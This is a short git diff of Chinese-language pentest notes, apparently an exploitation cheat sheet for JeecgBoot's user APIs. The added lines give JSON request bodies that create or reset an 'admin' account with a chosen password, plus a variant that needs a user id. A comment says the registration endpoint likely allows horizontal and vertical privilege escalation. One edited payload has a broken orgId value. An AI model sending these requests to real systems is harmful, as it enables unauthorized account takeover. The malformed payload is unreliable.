@@ -108,7 +108,10 @@ Referer: http://ji
 Content-Type: application/json;charset=UTF-8
 Content-Length: 97
 
-{"username":"admin","password":"123456byxe","confirmpassword":"123456byxe","orgId":"LIS20170328006643931"}
+{"username":"admin","password":"123456byxe","confirmpassword":"123456byxe","orgId":"“}
+
+有的可能要id来
+{"id":"1815206694234484737","username":"ome","password":"123456","confirmpassword":"123456"}
 ```
 
 删除用户delete
@@ -142,7 +145,7 @@ Content-Type: application/json
 }
 ```
 
-用户注册
+用户注册，大概率可以水平越权和权限提升。
 ```
 /api/jeecg-system/sms
 POST /jeecg-boot/sys/user/register HTTP/1.1
